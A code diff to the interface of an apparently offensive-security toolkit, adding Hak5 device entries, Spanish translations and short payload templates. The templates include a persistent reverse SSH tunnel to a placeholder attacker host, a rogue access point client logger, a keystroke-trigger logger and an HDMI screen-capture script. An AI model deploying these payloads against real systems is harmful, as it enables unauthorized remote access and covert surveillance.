@@ -6025,7 +6025,42 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
         m5:      { name: 'M5 Stack',          icon: '📟', ext: 'py',  lang: 'micropython',   desc: 'ESP32-based multi-tool payloads' },
         shack:   { name: 'Shark Jack',        icon: '🦈', ext: 'txt', lang: 'bash',          desc: 'Ethernet remote access payloads' },
         squirrel: { name: 'Packet Squirrel Mark II', icon: '🐿️', ext: 'sh', lang: 'bash', desc: 'Inline ethernet tap, MITM & pivot payloads' },
-        shark:   { name: 'Shark Jack Display', icon: '🦈', ext: 'sh',  lang: 'bash',          desc: 'Ethernet rogue with OLED vetting display payloads' }
+        shark:   { name: 'Shark Jack Display', icon: '🦈', ext: 'sh',  lang: 'bash',          desc: 'Ethernet rogue with OLED vetting display payloads' },
+        turtle:  { name: 'LAN Turtle Hub',    icon: '🐢', ext: 'sh',  lang: 'bash',          desc: 'USB ethernet adapter with remote-access payloads' },
+        pineapple: { name: 'WiFi Pineapple',  icon: '🍍', ext: 'sh',  lang: 'bash',          desc: 'Wireless auditing & rogue AP payloads' },
+        pager:   { name: 'WiFi Pineapple Pager', icon: '📟', ext: 'sh', lang: 'bash',         desc: 'Portable wireless recon & alerting payloads' },
+        keycroc: { name: 'Key Croc',          icon: '🐊', ext: 'sh',  lang: 'bash',          desc: 'Keystroke-logging with trigger-based payloads' },
+        crab:    { name: 'Screen Crab',       icon: '🦀', ext: 'sh',  lang: 'bash',          desc: 'HDMI screen-capture implant payloads' },
+        unblocker: { name: 'O.MG UnBlocker',  icon: '🚫', ext: 'sh',  lang: 'bash',          desc: 'USB data-blocker / clean-power payloads' }
+    };
+
+    // Spanish device descriptions (brand names stay the same).
+    const HAK5_DESC_ES = {
+        bunny:     'Ataques HID estilo USB Rubber Ducky',
+        omg:       'Payloads de cable trampa con WiFi',
+        m5:        'Payloads multiherramienta basados en ESP32',
+        shack:     'Payloads de acceso remoto por Ethernet',
+        squirrel:  'Tap Ethernet en línea, MITM y pivot',
+        shark:     'Ethernet rogue con display OLED de validación',
+        turtle:    'Adaptador Ethernet USB con payloads de acceso remoto',
+        pineapple: 'Payloads de auditoría inalámbrica y AP rogue',
+        pager:     'Payloads portátiles de reconocimiento y alertas inalámbricas',
+        keycroc:   'Keylogger con payloads disparados por teclas',
+        crab:      'Payloads de captura de pantalla por HDMI',
+        unblocker: 'Payloads de bloqueo de datos USB / alimentación limpia'
+    };
+
+    function hak5Desc(deviceId) {
+        const dev = hak5Devices[deviceId];
+        if (!dev) return '';
+        return (window.currentLang === 'es' && HAK5_DESC_ES[deviceId]) ? HAK5_DESC_ES[deviceId] : dev.desc;
+    }
+
+    window.refreshHak5Lang = function () {
+        if (currentHak5Device && hak5Devices[currentHak5Device]) {
+            const el = document.getElementById('hak5-device-desc');
+            if (el) el.textContent = hak5Desc(currentHak5Device);
+        }
     };
 
     const HAK5_TEMPLATES = {
@@ -6048,6 +6083,26 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
         ],
         shark: [
             { name: 'OLED status stamp', code: '#!/bin/bash\n# Shark Jack Display — arming runs on switch\nLED ATTACK\nifconfig eth0 up\necho "[+] Shark Jack Display online" > /tmp/run.log\nLED FINISH' }
+        ],
+        turtle: [
+            { name: 'Reverse SSH autossh', code: '#!/bin/bash\n# LAN Turtle Hub — persistent reverse SSH\nLED ATTACK\nautossh -M 0 -N -R 2222:localhost:22 root@<ATTACKER> -o ServerAliveInterval=30\nLED FINISH' },
+            { name: 'Network sweep', code: '#!/bin/bash\n# LAN Turtle Hub — quick subnet sweep\nfor ip in $(seq 1 254); do (ping -c1 -W1 192.168.1.$ip >/dev/null && echo "up: 192.168.1.$ip") & done; wait' }
+        ],
+        pineapple: [
+            { name: 'Rogue AP + recon', code: '#!/bin/bash\n# WiFi Pineapple — start AP and log clients\nLED ATTACK\npineapple_ap_start\nwhile true; do pineapple_clients >> /tmp/clients.log; sleep 30; done' },
+            { name: 'SSID pool broadcast', code: '#!/bin/bash\n# WiFi Pineapple — broadcast saved SSID pool\nLED ATTACK\npineapple_ssid_pool start\nLED FINISH' }
+        ],
+        pager: [
+            { name: 'Recon sweep + alert', code: '#!/bin/bash\n# WiFi Pineapple Pager — periodic scan with alert\nLED ATTACK\nwhile true; do pineapple_scan > /tmp/scan.txt; pineapple_pager_alert "scan done"; sleep 60; done' }
+        ],
+        keycroc: [
+            { name: 'Trigger on "sudo"', code: '#!/bin/bash\n# Key Croc — react to a keystroke string\n# In the Key Croc UI set the match string to: sudo\nATTACKMODE HID STORAGE\nLED ATTACK\necho "[+] trigger captured" >> /root/loot/triggers.txt\nLED FINISH' }
+        ],
+        crab: [
+            { name: 'Capture 60s clip', code: '#!/bin/bash\n# Screen Crab — grab an HDMI frame set\nLED ATTACK\nmkdir -p /root/loot/screen\nffmpeg -f v4l2 -i /dev/video0 -t 60 -c copy /root/loot/screen/clip.mkv\nLED FINISH' }
+        ],
+        unblocker: [
+            { name: 'Status LED test', code: '#!/bin/bash\n# O.MG UnBlocker — quick self-test / status\nLED ATTACK\nsleep 1\nLED FINISH' }
         ]
     };
     let currentHak5Device = 'bunny';
@@ -6098,7 +6153,7 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
         // Update UI
         document.getElementById('hak5-device-name').textContent = dev.name;
         document.getElementById('hak5-device-icon').textContent = dev.icon;
-        document.getElementById('hak5-device-desc').textContent = dev.desc;
+        document.getElementById('hak5-device-desc').textContent = hak5Desc(deviceId);
         document.getElementById('hak5-lang').textContent = dev.lang;
         document.getElementById('hak5-editor').value = '';
         document.getElementById('hak5-payload-name').value = '';
@@ -7666,6 +7721,207 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
         loginLockTitle:    { en: 'Locked — click to open auth', es: 'Bloqueado — clic para autenticarse' },
     };
 
+    // ── i18n completions (es) — tabs añadidos post-v2 (audit/burp/canary/coverage/
+    //    dlp/exif/opd/osint/plugins/router/skills). Antes solo tenían texto en
+    //    inglés hardcodeado; ahora traducen en ambos idiomas. ──
+    Object.assign(translations, {
+        // Audit Log
+        'audit-title':        { en: '📜 Audit Log',            es: '📜 Registro de auditoría' },
+        'audit-refresh':      { en: '🔄 Refresh',              es: '🔄 Actualizar' },
+        'audit-manual':       { en: '✎ Manual Entry',          es: '✎ Entrada manual' },
+        'audit-logs':         { en: 'Recent Logs',             es: 'Registros recientes' },
+        'audit-no-logs':      { en: 'No logs yet.',            es: 'Aún no hay registros.' },
+        'audit-manual-submit':{ en: '✓ Submit Entry',          es: '✓ Enviar entrada' },
+        // Burp Bridge
+        'burp-title':         { en: '🦅 Burp Bridge',          es: '🦅 Puente Burp' },
+        'burp-refresh':       { en: '🔄 Refresh',              es: '🔄 Actualizar' },
+        'burp-clear':         { en: '🗑 Clear All',            es: '🗑 Borrar todo' },
+        'burp-requests':      { en: 'Requests',                es: 'Peticiones' },
+        'burp-endpoints':     { en: 'Endpoints',               es: 'Endpoints' },
+        'burp-tasks':         { en: 'Tasks',                   es: 'Tareas' },
+        'burp-issues':        { en: 'Issues',                  es: 'Incidencias' },
+        'burp-raw-title':     { en: 'Raw Request',             es: 'Petición cruda' },
+        'burp-no-data':       { en: 'No data yet.',            es: 'Aún no hay datos.' },
+        // Canary Tokens
+        'canary-title':       { en: '🪤 Canary Tokens',        es: '🪤 Tokens canario' },
+        'canary-generate-title': { en: 'Generate New Token',   es: 'Generar nuevo token' },
+        'canary-type-api':    { en: 'API Key',                 es: 'Clave API' },
+        'canary-type-db':     { en: 'Database URL',            es: 'URL de base de datos' },
+        'canary-type-jwt':    { en: 'JWT Token',               es: 'Token JWT' },
+        'canary-type-aws':    { en: 'AWS Key',                 es: 'Clave AWS' },
+        'canary-type-slack':  { en: 'Slack Token',             es: 'Token Slack' },
+        'canary-type-url':    { en: 'Webhook URL',             es: 'URL de webhook' },
+        'canary-type-env':    { en: '.env File',               es: 'Archivo .env' },
+        'canary-type-config': { en: 'Config File',             es: 'Archivo de configuración' },
+        'canary-generate-btn':{ en: '+ Generate',              es: '+ Generar' },
+        'canary-generating':  { en: 'Generating token...',     es: 'Generando token...' },
+        'canary-tokens-title':{ en: 'Active Tokens',           es: 'Tokens activos' },
+        'canary-empty':       { en: 'No tokens generated yet. Create one above.', es: 'Aún no hay tokens. Crea uno arriba.' },
+        'canary-events-title':{ en: 'Activation Events',       es: 'Eventos de activación' },
+        'canary-events-empty':{ en: 'No activation events recorded.', es: 'No hay eventos de activación registrados.' },
+        // Coverage
+        'coverage-title':     { en: '🧭 Coverage Matrix',      es: '🧭 Matriz de cobertura' },
+        'coverage-session-label': { en: 'Session',             es: 'Sesión' },
+        'coverage-pass-ratio':{ en: 'Pass ratio',              es: 'Ratio de éxito' },
+        'coverage-stat-total':{ en: 'Total',                   es: 'Total' },
+        'coverage-stat-tried':{ en: 'Tried',                   es: 'Probados' },
+        'coverage-stat-passed':{ en: 'Passed',                 es: 'Aprobados' },
+        'coverage-stat-failed':{ en: 'Failed',                 es: 'Fallidos' },
+        'coverage-stat-waf':  { en: 'WAF-Blocked',             es: 'Bloqueados por WAF' },
+        'coverage-mark-title':{ en: 'Mark a coverage row',     es: 'Marcar una fila de cobertura' },
+        'coverage-mark-btn':  { en: '✓ Mark',                  es: '✓ Marcar' },
+        'coverage-suggest-to-finding': { en: '→ Send failed to Findings', es: '→ Enviar fallidos a Hallazgos' },
+        'coverage-filter':    { en: 'Filter',                  es: 'Filtro' },
+        'coverage-clear-btn': { en: 'Clear',                   es: 'Limpiar' },
+        'coverage-next-title':{ en: '🧭 Next steps (failed > untested > WAF)', es: '🧭 Próximos pasos (fallidos > no probados > WAF)' },
+        // DLP Scanner
+        'dlp-title':          { en: '🛡️ DLP Scanner',          es: '🛡️ Escáner DLP' },
+        'dlp-ready':          { en: 'Ready',                   es: 'Listo' },
+        'dlp-text-tab':       { en: 'Raw Text',                es: 'Texto sin formato' },
+        'dlp-scan-btn':       { en: '🔍 Scan Text',            es: '🔍 Escanear texto' },
+        'dlp-file-tab':       { en: 'File Upload',             es: 'Subir archivo' },
+        'dlp-drop-text':      { en: 'Drop a file or click to upload', es: 'Suelta un archivo o haz clic para subir' },
+        'dlp-url-tab':        { en: 'URL Scan',                es: 'Escaneo de URL' },
+        'dlp-scan-url':       { en: 'Scan URL',                es: 'Escanear URL' },
+        'dlp-scanning':       { en: 'Scanning for PII...',     es: 'Buscando PII...' },
+        'dlp-findings':       { en: 'Findings',                es: 'Hallazgos' },
+        'dlp-findings-title': { en: 'Findings',                es: 'Hallazgos' },
+        'dlp-high':           { en: 'High',                    es: 'Alto' },
+        'dlp-medium':         { en: 'Medium',                  es: 'Medio' },
+        'dlp-low':            { en: 'Low',                     es: 'Bajo' },
+        'dlp-risk-score':     { en: 'Risk Score',              es: 'Puntuación de riesgo' },
+        'dlp-export-json':    { en: 'Export JSON',             es: 'Exportar JSON' },
+        'dlp-clear-results':  { en: 'Clear',                   es: 'Limpiar' },
+        // EXIF OSINT
+        'exif-title':         { en: 'EXIF Metadata OSINT',     es: 'OSINT de metadatos EXIF' },
+        'exif-ready':         { en: 'Ready',                   es: 'Listo' },
+        'exif-drop-text':     { en: 'Drop an image here or click to upload', es: 'Suelta una imagen aquí o haz clic para subir' },
+        'exif-drop-hint':     { en: 'Supports JPEG, PNG, TIFF, WebP (max 20MB)', es: 'Compatible con JPEG, PNG, TIFF, WebP (máx. 20MB)' },
+        'exif-analyze-btn':   { en: 'Analyze URL',             es: 'Analizar URL' },
+        'exif-analyzing':     { en: 'Analyzing image metadata...', es: 'Analizando metadatos de la imagen...' },
+        'exif-format':        { en: 'Format',                  es: 'Formato' },
+        'exif-dimensions':    { en: 'Dimensions',              es: 'Dimensiones' },
+        'exif-file-size':     { en: 'File Size',               es: 'Tamaño de archivo' },
+        'exif-has-exif':      { en: 'Has EXIF',                es: 'Tiene EXIF' },
+        'exif-gps-title':     { en: '📍 GPS Location',         es: '📍 Ubicación GPS' },
+        'exif-location':      { en: 'Location',                es: 'Ubicación' },
+        'exif-google-maps':   { en: 'Google Maps',             es: 'Google Maps' },
+        'exif-osm':           { en: 'OpenStreetMap',           es: 'OpenStreetMap' },
+        'exif-camera-title':  { en: '📸 Camera Information',   es: '📸 Información de cámara' },
+        'exif-metadata-title':{ en: '📝 Metadata',             es: '📝 Metadatos' },
+        'exif-thumbnail-title': { en: '🖼️ Embedded Thumbnail', es: '🖼️ Miniatura incrustada' },
+        'exif-raw-title':     { en: '📋 All EXIF Tags',        es: '📋 Todas las etiquetas EXIF' },
+        'exif-tag':           { en: 'Tag',                     es: 'Etiqueta' },
+        'exif-value':         { en: 'Value',                   es: 'Valor' },
+        'exif-no-exif':       { en: 'No EXIF metadata found in this image.', es: 'No se encontraron metadatos EXIF en esta imagen.' },
+        'exif-export-md':     { en: 'Export Markdown',         es: 'Exportar Markdown' },
+        'exif-export-html':   { en: 'Export HTML',             es: 'Exportar HTML' },
+        'exif-export-pdf':    { en: 'Export PDF',              es: 'Exportar PDF' },
+        'exif-copy-json':     { en: 'Copy JSON',               es: 'Copiar JSON' },
+        'exif-clear':         { en: 'Clear',                   es: 'Limpiar' },
+        // Op Admiral
+        'opd-specialist':     { en: '🧠 Specialist',           es: '🧠 Especialista' },
+        'opd-specialist-auto':{ en: '⚡ Auto (route)',         es: '⚡ Auto (enrutar)' },
+        'opd-model-title':    { en: '🧠 Model per specialist', es: '🧠 Modelo por especialista' },
+        'opd-model-for':      { en: 'Configured for',          es: 'Configurado para' },
+        'opd-model-provider': { en: 'Provider',                es: 'Proveedor' },
+        'opd-model-model':    { en: 'Model',                   es: 'Modelo' },
+        'opd-model-key':      { en: 'API key',                 es: 'Clave API' },
+        'opd-model-inherit':  { en: 'Inherit global AI settings', es: 'Heredar ajustes globales de IA' },
+        'opd-model-save':     { en: '💾 Save model',           es: '💾 Guardar modelo' },
+        'opd-routed-to':      { en: 'Routed to',               es: 'Enrutado a' },
+        'opd-session':        { en: 'Session',                 es: 'Sesión' },
+        'opd-episodic-memory':{ en: '🧠 Episodic Memory',      es: '🧠 Memoria episódica' },
+        'opd-clear-memory':   { en: '✕ Clear memory',          es: '✕ Borrar memoria' },
+        'opd-no-plans':       { en: 'No saved plans yet. Generated plans auto-save here.', es: 'Aún no hay planes guardados. Los planes generados se guardan aquí automáticamente.' },
+        // OSINT Recon
+        'osint-title':        { en: '🕵️ OSINT Recon',          es: '🕵️ Reconocimiento OSINT' },
+        'osint-ready':        { en: 'Ready',                   es: 'Listo' },
+        'osint-email-title':  { en: '📧 Email Recon',          es: '📧 Reconocimiento de email' },
+        'osint-check':        { en: 'Check',                   es: 'Comprobar' },
+        'osint-dork-title':   { en: '🔍 Google Dork',          es: '🔍 Google Dork' },
+        'osint-search':       { en: 'Search',                  es: 'Buscar' },
+        'osint-phone-title':  { en: '📱 Phone Lookup',         es: '📱 Búsqueda de teléfono' },
+        'osint-lookup':       { en: 'Lookup',                  es: 'Buscar' },
+        'osint-image-title':  { en: '🖼️ Reverse Image',        es: '🖼️ Búsqueda inversa de imagen' },
+        'osint-analyze':      { en: 'Analyze',                 es: 'Analizar' },
+        'osint-wayback-title':{ en: '📜 Wayback Machine',      es: '📜 Wayback Machine' },
+        'osint-fetch':        { en: 'Fetch',                   es: 'Obtener' },
+        'osint-ip-title':     { en: '📍 IP Geolocation',       es: '📍 Geolocalización de IP' },
+        'osint-locate':       { en: 'Locate',                  es: 'Localizar' },
+        'osint-username-title': { en: '👤 Username Recon',     es: '👤 Reconocimiento de usuario' },
+        'osint-scan':         { en: 'Scan',                    es: 'Escanear' },
+        'osint-github-title': { en: '🐙 GitHub Recon',         es: '🐙 Reconocimiento de GitHub' },
+        'osint-instagram-title': { en: '📸 Instagram Recon',   es: '📸 Reconocimiento de Instagram' },
+        'osint-instagram-lookup': { en: 'include lookup',      es: 'incluir búsqueda' },
+        'osint-dns-title':    { en: '🌐 DNS Recon',            es: '🌐 Reconocimiento DNS' },
+        'osint-resolve':      { en: 'Resolve',                 es: 'Resolver' },
+        'osint-whois-title':  { en: '🗂️ WHOIS / RDAP',         es: '🗂️ WHOIS / RDAP' },
+        'osint-pwned-title':  { en: '🛡️ Pwned Password',       es: '🛡️ Contraseña filtrada' },
+        'osint-urlhaus-title':{ en: '☠️ URLhaus',              es: '☠️ URLhaus' },
+        'osint-page-title':   { en: '📄 Page Snapshot',        es: '📄 Captura de página' },
+        'osint-extract':      { en: 'Extract',                 es: 'Extraer' },
+        'osint-code-title':   { en: '🔢 Code Search',          es: '🔢 Búsqueda de código' },
+        'osint-cert-title':   { en: '📜 Cert Transparency',    es: '📜 Transparencia de certificados' },
+        'osint-enumerate':    { en: 'Enumerate',               es: 'Enumerar' },
+        'osint-sigstore-title': { en: '🪪 Sigstore Rekor',     es: '🪪 Sigstore Rekor' },
+        'osint-query':        { en: 'Query',                   es: 'Consultar' },
+        'osint-urlscan-title':{ en: '🔎 urlscan.io',           es: '🔎 urlscan.io' },
+        'osint-mac-title':    { en: '📡 MAC Vendor',           es: '📡 Fabricante MAC' },
+        'osint-correlate-title': { en: '🔗 Correlate',         es: '🔗 Correlacionar' },
+        'osint-corcanalyze':  { en: 'Analyze',                 es: 'Analizar' },
+        // Plugins
+        'plugins-title':      { en: '🔌 Plugin System',        es: '🔌 Sistema de plugins' },
+        'plugins-stat-total': { en: 'Total',                   es: 'Total' },
+        'plugins-stat-loaded':{ en: 'Loaded',                  es: 'Cargados' },
+        'plugins-stat-discovered': { en: 'Discovered',         es: 'Descubiertos' },
+        'plugins-stat-error': { en: 'Errors',                  es: 'Errores' },
+        'plugins-no-plugins': { en: 'No plugins discovered.',  es: 'No se descubrieron plugins.' },
+        // Task Router
+        'router-title':       { en: '🧭 Task Router',          es: '🧭 Enrutador de tareas' },
+        'router-reload':      { en: '🔄 Reload config',        es: '🔄 Recargar configuración' },
+        'router-route-btn':   { en: '🚀 Route',                es: '🚀 Enrutar' },
+        'router-empty':       { en: 'Type a task hint to get the matching playbook.', es: 'Escribe una pista de tarea para obtener el playbook correspondiente.' },
+        'router-index':       { en: 'Tool Index',              es: 'Índice de herramientas' },
+        'router-hint':        { en: 'Run a full port scan on 10.0.0.5 / Scan the API and test JWT...', es: 'Ejecuta un escaneo de puertos sobre 10.0.0.5 / Escanea la API y prueba JWT...' },
+        'router-tools-filter':{ en: 'Filter',                  es: 'Filtrar' },
+        // SIEM
+        'siem-title':         { en: '📊 SIEM Dashboard',       es: '📊 Panel SIEM' },
+        // Skills
+        'skills-title':       { en: '📚 Skill Playbooks',      es: '📚 Playbooks de habilidades' },
+        'skills-refresh':     { en: '🔄 Refresh',              es: '🔄 Actualizar' },
+        'skills-playbooks':   { en: 'Skill Playbooks',         es: 'Playbooks de habilidades' },
+        'skills-redteam-title': { en: '⚠️ Red Team Lab',       es: '⚠️ Laboratorio Red Team' },
+        'skills-redteam-warning': { en: 'These skills require explicit authorization. Configure scope before loading. Offensive techniques — use only on systems you own or have written permission to test.', es: 'Estas habilidades requieren autorización explícita. Configura el alcance antes de cargarlas. Técnicas ofensivas — úsalas solo en sistemas propios o con permiso por escrito.' },
+        'skills-no-skills':   { en: 'No skills discovered.',   es: 'No se descubrieron habilidades.' },
+        'skills-create':      { en: 'Create New Skill',        es: 'Crear nueva habilidad' },
+        'skills-create-btn':  { en: '✓ Create Skill',          es: '✓ Crear habilidad' },
+        // Hak5 Payload Studio
+        'hak5StudioTitle':    { en: '🔌 Hak5 Payload Studio',  es: '🔌 Hak5 Payload Studio' },
+        'hak5Creds':          { en: '🔑 Credentials',          es: '🔑 Credenciales' },
+        'hak5Email':          { en: 'Email',                   es: 'Email' },
+        'hak5Password':       { en: 'Password',                es: 'Contraseña' },
+        'hak5CredSave':       { en: 'Save',                    es: 'Guardar' },
+        'hak5CredsNote':      { en: 'Credentials stored locally for quick launch.', es: 'Credenciales guardadas localmente para acceso rápido.' },
+        'hak5Launch':         { en: 'Launch Payload Studio',   es: 'Abrir Payload Studio' },
+        'hak5LaunchDesc':     { en: 'Open in browser tab — create, edit, and deploy Hak5 payloads', es: 'Se abre en una pestaña — crea, edita y despliega payloads Hak5' },
+        'hak5Supports':       { en: 'Supports Bash Bunny, OMG Cable, M5 Stack, Shark Jack, Packet Squirrel Mark II, Shark Jack Display, LAN Turtle Hub, WiFi Pineapple, WiFi Pineapple Pager, Key Croc, Screen Crab, O.MG UnBlocker and all Hak5 devices.', es: 'Compatible con Bash Bunny, OMG Cable, M5 Stack, Shark Jack, Packet Squirrel Mark II, Shark Jack Display, LAN Turtle Hub, WiFi Pineapple, WiFi Pineapple Pager, Key Croc, Screen Crab, O.MG UnBlocker y todos los dispositivos Hak5.' },
+        'hak5ReposTitle':     { en: '📦 GitHub — Payload Repos', es: '📦 GitHub — Repos de payloads' },
+        'hak5EditorTitle':    { en: '✏️ Payload Editor',       es: '✏️ Editor de payloads' },
+        'hak5Save':           { en: '💾 Save',                 es: '💾 Guardar' },
+        'hak5Load':           { en: '📂 Load',                 es: '📂 Cargar' },
+        'hak5List':           { en: '📋 List',                 es: '📋 Listar' },
+        'hak5Clear':          { en: '✕ Clear',                 es: '✕ Limpiar' },
+        'hak5AI':             { en: '🤖 AI',                   es: '🤖 IA' },
+        'hak5Template':       { en: 'Template',                es: 'Plantilla' },
+        'hak5Insert':         { en: '✦ Insert',                es: '✦ Insertar' },
+        'hak5Check':          { en: '✓ Check',                 es: '✓ Validar' },
+        'hak5Export':         { en: '⬇ Export',                es: '⬇ Exportar' },
+        'hak5SavedLabel':     { en: 'Saved:',                  es: 'Guardados:' },
+        'hak5PayloadLabel':   { en: 'PAYLOAD',                 es: 'PAYLOAD' },
+        'hak5EditorPlaceholder': { en: 'Enter your Hak5 payload here...', es: 'Escribe aquí tu payload Hak5...' },
+    });
+
     window.currentLang = localStorage.getItem('vulnforge_lang') || 'en';
 
     window.switchLanguage = function () {
@@ -7700,6 +7956,9 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
 
         // Update title
         document.title = `M.I.R.V. — ${lang === 'en' ? 'Incident Response & Vulnerability Framework' : 'Framework de Respuesta a Incidentes y Vulnerabilidades'}`;
+
+        // Refresh dynamic (non data-i18n) widgets: Hak5 device description
+        if (window.refreshHak5Lang) window.refreshHak5Lang();
 
         // Update placeholders
         const targetPlaceholder = translations.targetPlaceholder[lang];
